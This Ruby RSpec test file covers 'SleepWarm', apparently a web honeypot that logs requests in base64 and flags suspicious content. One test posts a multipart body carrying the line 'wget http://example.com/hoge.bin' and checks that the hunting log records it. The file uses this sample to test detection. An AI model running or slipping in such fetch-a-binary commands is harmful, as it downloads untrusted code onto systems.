require "stringio"
require "base64"

describe SleepWarm::Application do
  include_context "rackapp testing"

  context "GET with no header" do
    it "responds with a 200 OK" do
      get 'http://example.com/'
      expect(last_response.status).to eq(200)
      expect(last_response.body).not_to be_empty
      @access_log.rewind
      access_log = @access_log.read
      expect(access_log).to include("GET http://example.com")
      expect(access_log).to end_with("\n")
    end
  end

  context "GET with a header" do
    it "responds with a 200 OK" do
      header "User-Agent", "Firefox"
      get 'http://example.com'
      expect(last_response.status).to eq(200)
      expect(last_response.body).not_to be_empty

      @access_log.rewind
      access_log = @access_log.read
      decoded_req = Base64.decode64(access_log.split.last)
      expect(decoded_req).to include("GET http://example.com")
      expect(decoded_req).to include("User-Agent: Firefox")
    end
  end

  context "POST with no payload" do
    it "responds with a 200 OK" do
      post 'http://example.com'
      expect(last_response.status).to eq(200)
      expect(last_response.body).not_to be_empty

      @access_log.rewind
      access_log = @access_log.read
      decoded_req = Base64.decode64(access_log.split.last)
      expect(decoded_req).to include("POST http://example.com")
    end
  end

  context "POST with payload" do
    it "responds with a 200 OK" do
      input = <<EOF
--AaB03x\r
Content-Type: text/xml; charset=utf-8\r
Content-Id: <soap-start>\r
Content-Transfer-Encoding: 7bit\r
\r
foo\r
wget http://example.com/hoge.bin\r
--AaB03x--\r
EOF
      post 'http://example.com', input
      expect(last_response.status).to eq(200)
      expect(last_response.body).not_to be_empty

      @access_log.rewind
      access_log = @access_log.read
      decoded_req = Base64.decode64(access_log.split.last)
      expect(decoded_req).to include("POST http://example.com")
      expect(decoded_req).to include("Content-Length: #{input.length}")
      expect(decoded_req).to include("Content-Type: application/x-www-form-urlencoded")
      expect(decoded_req).to include("foo")

      @hunting_log.rewind
      hunting_log = @hunting_log.read
      expect(hunting_log).to include("wget http://example.com/hoge.bin")
    end
  end
end
